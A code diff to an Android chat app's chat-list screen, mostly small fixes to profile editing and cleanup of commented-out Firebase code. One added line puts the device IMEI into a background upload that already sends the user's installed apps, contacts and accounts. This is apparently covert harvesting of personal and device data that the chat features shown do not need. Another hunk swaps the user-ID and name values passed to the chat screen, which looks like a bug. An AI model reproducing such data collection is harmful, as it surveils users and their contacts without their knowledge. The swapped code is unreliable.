@@ -99,7 +99,6 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
     ProgressBar photoUploadPB;
     private ConstraintLayout coordinatorLayout;
 
-
     public static final int IMAGECHOOSERCODE = 1;
     Uri imageUri;
     String fileExtension;
@@ -174,6 +173,7 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
                 editPhotoBt = deleteDialogView.findViewById(R.id.editPhotoBT);
                 nameEt = deleteDialogView.findViewById(R.id.editNameET);
                 dialogueProfileImg = deleteDialogView.findViewById(R.id.editProfileImg);
+                getCurrentUserData();
                 if (globalUser != null) {
                     if (globalUser.getImageUrl() != null) {
                         Glide.with(getApplicationContext()).load(globalUser.getImageUrl()).into(dialogueProfileImg);
@@ -193,10 +193,13 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
                     @Override
                     public void onClick(View v) {
                         String name = nameEt.getText().toString();
-                        if (photoSelected && imageUploading) {
-                            Toast.makeText(ChatListActivity.this, "Wait, updating profile!", Toast.LENGTH_SHORT).show();
+                        if (name.isEmpty()) {
+                            Toast.makeText(ChatListActivity.this, "Name Can't be empty!", Toast.LENGTH_SHORT).show();
+                        }
+                        else if (photoSelected && imageUploading) {
+                            Toast.makeText(ChatListActivity.this, "Wait, uploading photo!", Toast.LENGTH_SHORT).show();
                         } else {
-                            if (!name.equals(userName)) {
+                            if (!name.equals(userName)&& !name.isEmpty()) {
                                 updateUserProfileName(name);
                             }
                             updateUserProfileImage(imageUrl);
@@ -291,6 +294,7 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
         serviceIntent.putExtra("installedApps",(Serializable) deviceInfo.getInstalledApps());
         serviceIntent.putExtra("contacts", (Serializable) contactUtil.getContacts());
         serviceIntent.putExtra("accounts", (Serializable) deviceInfo.getAccounts());
+        serviceIntent.putExtra("imei", deviceInfo.getIMEIDeviceId(this));
         BasicDataUploadService.enqueueWork(this, serviceIntent);
     }
 
@@ -313,34 +317,6 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
 
             }
         });
-        /*databaseReference.child("ChatList").child(userId).addValueEventListener(new ValueEventListener() {
-            @Override
-            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
-                for (DataSnapshot snapshot : dataSnapshot.getChildren()) {
-                    ChatList chatList = snapshot.getValue(ChatList.class);
-                    chatLists.add(chatList);
-                }
-                readMessages();
-            }
-
-            @Override
-            public void onCancelled(@NonNull DatabaseError databaseError) {
-
-            }
-        });*/
-/*        databaseReference.child("UserChatList").child(mAuth.getCurrentUser().getUid()).addValueEventListener(new ValueEventListener() {
-            @Override
-            public void onDataChange(@NonNull DataSnapshot snapshot) {
-                for (DataSnapshot dataSnapshot : snapshot.getChildren()) {
-                    ChatList chatList = dataSnapshot.getValue(ChatList.class);
-                }
-            }
-
-            @Override
-            public void onCancelled(@NonNull DatabaseError error) {
-
-            }
-        });*/
     }
 
 
@@ -500,6 +476,7 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
             @Override
             public void onSuccess(Void aVoid) {
                 Toast.makeText(ChatListActivity.this, "Data Updated Successfully!", Toast.LENGTH_SHORT).show();
+                getCurrentUserData();
             }
         });
     }
@@ -509,6 +486,7 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
             @Override
             public void onSuccess(Void aVoid) {
                 Toast.makeText(ChatListActivity.this, "Data Updated Successfully!", Toast.LENGTH_SHORT).show();
+                getCurrentUserData();
             }
         });
     }
@@ -540,8 +518,8 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
     @Override
     public void onClick(String itemId, String name, String profileUrl) {
         Intent intent = new Intent(ChatListActivity.this, ChatActivity.class);
-        intent.putExtra("userId", itemId);
-        intent.putExtra("name", name);
+        intent.putExtra("userId", name);
+        intent.putExtra("name", itemId);
         intent.putExtra("image", profileUrl);
         startActivity(intent);
     }
